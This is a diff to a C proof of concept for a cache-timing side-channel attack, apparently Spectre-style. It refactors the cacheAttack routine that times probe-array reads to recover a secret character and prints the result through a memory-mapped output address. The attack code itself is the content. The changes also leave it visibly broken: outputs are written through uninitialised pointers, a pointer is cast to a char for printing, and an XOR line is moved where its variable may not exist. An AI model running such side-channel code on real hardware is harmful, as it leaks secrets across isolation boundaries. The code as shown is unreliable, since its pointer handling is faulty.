@@ -101,13 +101,13 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
 	// and its corresponding stored array value means cache hits.
 	static uint32_t results[RESULT_ARRAY_SIZE];
-	uint8_t hitIdx;
-	uint32_t hitTimes;
+	uint8_t* hitIdx[2];
+	uint32_t* hitTimes[2];
 
 // Memory address for displaying characters (in place of printf)
 volatile char* outputAddr = (char*)0x40002000;
 
-void cacheAttack(uint8_t outIdx, uint32_t outTimes){
+void cacheAttack(uint8_t* outIdx, uint32_t* outTimes){
 
 			register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
 			// Read out probeArray and see the hit secret value.
@@ -125,14 +125,15 @@ void cacheAttack(uint8_t outIdx, uint32_t outTimes){
 				}
 			}
 
+	results[0] ^= dummy;
 	
-	outIdx = 0;
-	outTimes = 0;
+	outIdx[0] = 0;
+	outTimes[0] = 0;
 
 	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
-		if (results[i] > outTimes){
-			outIdx = i;
-			outTimes = results[i];
+		if (results[i] > outTimes[0]){
+			outIdx[0] = i;
+			outTimes[0] = results[i];
 		}
 	}
 
@@ -221,14 +222,9 @@ void main(){
 		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
 		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
 		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
-		results[0] ^= dummy;
+	//	results[0] ^= dummy;
 	//	topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
 	//	resultOutput(results, RESULT_ARRAY_SIZE, output, hitArray);
-
-	uint8_t* output;
-	output[0] = hitIdx;
-	uint32_t* hitArray;
-	hitArray[0] = hitTimes;
 
 		*outputAddr = 'V';
     	*outputAddr = 'a';
@@ -237,16 +233,16 @@ void main(){
     	*outputAddr = 'e';
     	*outputAddr = ':';
     	*outputAddr = ' ';
-    	*outputAddr = (char)output[0];// + '0';//
-	//	*outputAddr = (char)hitIdx;
+    //	*outputAddr = (char)output[0];// + '0';//
+		*outputAddr = (char)hitIdx[0];
         *outputAddr = ' ';
         *outputAddr = 'H';
         *outputAddr = 'i';
         *outputAddr = 't';
         *outputAddr = ':';
         *outputAddr = ' ';
-        *outputAddr = (char)hitArray[0] + '0';
-	//	*outputAddr = (char)hitTimes + '0';
+    //    *outputAddr = (char)hitArray[0] + '0';
+		*outputAddr = (char)hitTimes[0] + '0';
         *outputAddr = '\n';
 
 		attackIdx++;
